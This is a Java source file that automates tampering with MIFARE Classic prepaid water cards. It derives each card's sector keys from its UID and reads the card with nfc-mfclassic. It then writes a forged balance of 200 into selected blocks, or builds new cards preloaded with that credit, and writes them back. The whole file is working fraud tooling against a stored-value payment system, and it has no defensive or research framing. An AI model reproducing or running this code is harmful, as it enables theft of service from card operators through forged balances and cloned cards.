package org.genanik.util;

import org.genanik.python2.python2javaTranslater;

import java.io.IOException;
import java.util.List;
import java.util.Scanner;

public class autoOperator {

    public List<String> autoGetKeys(){
        nfcTools nfcOperateTool = new nfcTools();
        WaterCardUtil waterCardUtil = new WaterCardUtil();
        List<String> result = waterCardUtil.getKeys(nfcOperateTool.getUid());
        System.out.println(result);
        return result;
    }

    private List<List<List<String>>> readFullWaterCard(String keysFilePath, String outputName) throws IOException {
        terminal ter = new terminal();
        readBytes readByte = new readBytes();
        nfcTools nfc = new nfcTools();

        System.out.println(ter.runCommand("nfc-mfclassic r b " + outputName + " " + keysFilePath));
        return nfc.formatDump(readByte.readByteFile(outputName));
    }

    public List<List<List<String>>> autoReadFullWaterCard() throws IOException {
        //实例化工具
        autoOperator operator = new autoOperator();
        readBytes bytesOpetater = new readBytes();
        WaterCardUtil wcutil = new WaterCardUtil();
        nfcTools nfcTool = new nfcTools();
        //初始化
        String dumpStr = wcutil.noneKeyACard;
        List<String> keys = operator.autoGetKeys();
        String uid = nfcTool.getUid();
        //写入 Key A
        for (int i = 0; i < keys.size(); i++) {
            dumpStr = dumpStr.replaceFirst("ffffffffffff", keys.get(i));
            System.out.println(keys.get(i));
            System.err.println(dumpStr);
        }
        //写入 uid
        dumpStr = dumpStr.replace("thissuid", uid);

        //Debug
        System.out.println(dumpStr);

        bytesOpetater.writeByteFile("keyDump.mfd",dumpStr);
        //nfc-mfclassic r b dump.mfd keyDump.mfd
        return readFullWaterCard("keyDump.mfd", uid + ".mfd");
    }

    public List<List<List<String>>> makeNewKeysMFD() throws IOException {//需要刷卡
        //实例化工具
        autoOperator operator = new autoOperator();
        readBytes bytesOpetater = new readBytes();
        WaterCardUtil wcutil = new WaterCardUtil();
        nfcTools nfcTool = new nfcTools();
        //初始化
        String dumpStr = wcutil.noneKeyACard;
        List<String> keys = operator.autoGetKeys();
        String uid = nfcTool.getUid();
        //写入 Key A
        for (int i = 0; i < keys.size(); i++) {
            dumpStr = dumpStr.replaceFirst("ffffffffffff", keys.get(i));
            System.out.println(keys.get(i));
            System.err.println(dumpStr);
        }
        //写入 uid
        dumpStr = dumpStr.replace("thissuid", uid);

        //Debug
        System.out.println(dumpStr);

        return nfcTool.formatDump(dumpStr);
    }

    public String makeAmountData(String integerData){
        return new python2javaTranslater().p2j("water.py", integerData);
    }

    public void autoAmountData() throws IOException {
        List<List<List<String>>> card = autoReadFullWaterCard();
        Scanner sc = new Scanner(System.in);
        readBytes bytesUtil = new readBytes();
        terminal ter = new terminal();

        String uid = new nfcTools().getUid();

        for (int i = 0; i < card.size(); i++) {
            System.out.println(card.get(i));
        }

        String moneyData = makeAmountData("200");
        int locate = 0;
        String keyword0 = moneyData.substring(locate, locate+6*2).replaceAll(" ", "");
        locate += 6*2;
        String keyword1 = moneyData.substring(locate, locate+4*2).replaceAll(" ", "");
        locate += 4*2;
        String keyword2 = moneyData.substring(locate, locate+6*2).replaceAll(" ", "");

        for (int ti = 0; ti < 2; ti++) {
            System.out.println("选择sector:");
            int selSectors = sc.nextInt();
            System.out.println("选择block:");
            int selBlock = sc.nextInt();
            card.get(selSectors).get(selBlock).set(0, keyword0);
            card.get(selSectors).get(selBlock).set(1, keyword1);
            card.get(selSectors).get(selBlock).set(2, keyword2);
            System.out.println("card variable has been update");
            for (int i = 0; i < card.size(); i++) {
                System.out.println(card.get(i));
            }
        }
        System.out.println("开始保存到changed.mfd");
        String dumpStr = "";
        for (int i = 0; i < card.size(); i++) {
            for (int j = 0; j < card.get(i).size(); j++) {
                for (int k = 0; k < card.get(i).get(j).size(); k++) {
                    dumpStr += card.get(i).get(j).get(k);
                }
            }
        }
        System.out.println(dumpStr);
        bytesUtil.writeByteFile( uid + "Changed.mfd", dumpStr);
        System.out.println(ter.runCommand("nfc-mfclassic w b " + uid + "Changed.mfd" + " " + uid + "Changed.mfd"));
    }

    public void autoCreateNewWaterCard() throws IOException {
        List<List<List<String>>> card = makeNewKeysMFD();
        Scanner sc = new Scanner(System.in);
        readBytes bytesUtil = new readBytes();
        terminal ter = new terminal();

        String uid = new nfcTools().getUid();

        for (int i = 0; i < card.size(); i++) {
            System.out.println(card.get(i));
        }

        String moneyData = makeAmountData("200");//default amount 200
        int locate = 0;
        String keyword0 = moneyData.substring(locate, locate+6*2).replaceAll(" ", "");
        locate += 6*2;
        String keyword1 = moneyData.substring(locate, locate+4*2).replaceAll(" ", "");
        locate += 4*2;
        String keyword2 = moneyData.substring(locate, locate+6*2).replaceAll(" ", "");

        card.get(1).get(0).set(0, keyword0);
        card.get(1).get(0).set(1, keyword1);
        card.get(1).get(0).set(2, keyword2);
        card.get(1).get(1).set(0, "5701d408ffbb");
        card.get(1).get(1).set(1, "68001c09");
        card.get(1).get(1).set(2, "da0000006998");
        card.get(1).get(2).set(0, keyword0);
        card.get(1).get(2).set(1, keyword1);
        card.get(1).get(2).set(2, keyword2);
        System.out.println("card variable has been update");
        for (int i = 0; i < card.size(); i++) {
            System.out.println(card.get(i));
        }

        System.out.println("开始保存到NewCard.mfd");
        String dumpStr = "";
        for (int i = 0; i < card.size(); i++) {
            for (int j = 0; j < card.get(i).size(); j++) {
                for (int k = 0; k < card.get(i).get(j).size(); k++) {
                    dumpStr += card.get(i).get(j).get(k);
                }
            }
        }
        System.out.println(dumpStr);
        bytesUtil.writeByteFile( uid + "NewCard.mfd", dumpStr);
        System.out.println(ter.runCommand("nfc-mfclassic w b " + uid + "NewCard.mfd" + " " + uid + "NewCard.mfd"));
    }
}
